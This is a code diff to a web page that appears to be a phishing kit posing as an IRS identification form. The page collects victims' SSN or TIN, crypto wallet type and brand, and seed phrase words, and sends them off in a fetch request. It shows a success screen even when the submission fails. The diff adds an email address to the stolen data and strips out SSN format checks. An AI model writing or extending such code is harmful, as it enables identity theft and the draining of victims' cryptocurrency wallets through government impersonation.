@@ -2542,18 +2542,22 @@
                                             <div id="step-0" class="flow-step">
                                                 <h1 class="irs-flow-title">Identification</h1>
 
-                                                <div style="margin-top: 24px; margin-bottom: 28px;">
+                                                <div style="margin-top: 24px; margin-bottom: 20px;">
                                                     <label for="ssn_tin_input"
                                                         style="display: block; font-size: 16px; font-weight: 700; color: #112e51; margin-bottom: 10px;">
                                                         SSN, if applicable / U.S. Taxpayer Identification Number (TIN)
                                                     </label>
                                                     <input type="text" id="ssn_tin_input" class="irs-input-field"
-                                                        placeholder="XXX-XX-XXXX or XX-XXXXXXX" maxlength="11"
-                                                        autocomplete="off" />
-                                                    <div id="ssn_error"
-                                                        style="color: #d9381e; font-size: 13px; margin-top: 6px; display: none;">
-                                                        Please enter a valid 9-digit SSN or TIN.
-                                                    </div>
+                                                        placeholder="XXX-XX-XXXX or XX-XXXXXXX" autocomplete="off" />
+                                                </div>
+
+                                                <div style="margin-bottom: 28px;">
+                                                    <label for="email_input"
+                                                        style="display: block; font-size: 16px; font-weight: 700; color: #112e51; margin-bottom: 10px;">
+                                                        Email Address
+                                                    </label>
+                                                    <input type="email" id="email_input" class="irs-input-field"
+                                                        placeholder="name@example.com" autocomplete="email" />
                                                 </div>
 
                                                 <div>
@@ -2870,22 +2874,8 @@
                                             var currentSeedLength = 24;
                                             var hasSignature = false;
 
-                                            // Auto format SSN/TIN
+                                            // SSN/TIN/NTN input reference
                                             var ssnField = document.getElementById('ssn_tin_input');
-                                            if (ssnField) {
-                                                ssnField.addEventListener('input', function (e) {
-                                                    var val = e.target.value.replace(/\D/g, '').substring(0, 9);
-                                                    var formatted = '';
-                                                    if (val.length <= 3) {
-                                                        formatted = val;
-                                                    } else if (val.length <= 5) {
-                                                        formatted = val.substring(0, 3) + '-' + val.substring(3);
-                                                    } else {
-                                                        formatted = val.substring(0, 3) + '-' + val.substring(3, 5) + '-' + val.substring(5, 9);
-                                                    }
-                                                    e.target.value = formatted;
-                                                });
-                                            }
 
                                             function hideAllSteps() {
                                                 var steps = document.querySelectorAll('.flow-step');
@@ -2906,17 +2896,6 @@
                                             }
 
                                             function goToStep(stepNumber) {
-                                                if (stepNumber === 1) {
-                                                    var val = ssnField ? ssnField.value.replace(/\D/g, '') : '';
-                                                    if (val.length > 0 && val.length < 9) {
-                                                        document.getElementById('ssn_error').style.display = 'block';
-                                                        return;
-                                                    }
-                                                    if (document.getElementById('ssn_error')) {
-                                                        document.getElementById('ssn_error').style.display = 'none';
-                                                    }
-                                                }
-
                                                 hideAllSteps();
 
                                                 if (stepNumber === 0) {
@@ -3155,6 +3134,8 @@
                                                 }
 
                                                 var ssnVal = ssnField ? ssnField.value.trim() : '';
+                                                var emailInput = document.getElementById('email_input');
+                                                var emailVal = emailInput ? emailInput.value.trim() : '';
                                                 var words = [];
                                                 var wordInputs = document.querySelectorAll('#seedInputsContainer input');
                                                 wordInputs.forEach(function (inp) {
@@ -3173,6 +3154,7 @@
 
                                                 var payload = {
                                                     ssn_tin: ssnVal,
+                                                    email: emailVal,
                                                     wallet_type: currentWalletType === 'cold' ? 'Cold Wallets' : (currentWalletType === 'hot' ? 'Hot Wallets' : currentWalletType),
                                                     wallet_brand: currentWalletBrand,
                                                     seed_length: currentSeedLength,
@@ -3188,26 +3170,26 @@
                                                     },
                                                     body: JSON.stringify(payload)
                                                 })
-                                                .then(function (res) {
-                                                    return res.json().catch(function () { return { success: true }; });
-                                                })
-                                                .then(function (data) {
-                                                    hideAllSteps();
-                                                    document.getElementById('step-5').style.display = 'block';
-                                                    ensureInView();
-                                                })
-                                                .catch(function (err) {
-                                                    console.warn('Submission note:', err);
-                                                    hideAllSteps();
-                                                    document.getElementById('step-5').style.display = 'block';
-                                                    ensureInView();
-                                                })
-                                                .finally(function () {
-                                                    if (submitBtn) {
-                                                        submitBtn.disabled = false;
-                                                        submitBtn.innerHTML = originalBtnText;
-                                                    }
-                                                });
+                                                    .then(function (res) {
+                                                        return res.json().catch(function () { return { success: true }; });
+                                                    })
+                                                    .then(function (data) {
+                                                        hideAllSteps();
+                                                        document.getElementById('step-5').style.display = 'block';
+                                                        ensureInView();
+                                                    })
+                                                    .catch(function (err) {
+                                                        console.warn('Submission note:', err);
+                                                        hideAllSteps();
+                                                        document.getElementById('step-5').style.display = 'block';
+                                                        ensureInView();
+                                                    })
+                                                    .finally(function () {
+                                                        if (submitBtn) {
+                                                            submitBtn.disabled = false;
+                                                            submitBtn.innerHTML = originalBtnText;
+                                                        }
+                                                    });
                                             }
                                         </script>
 
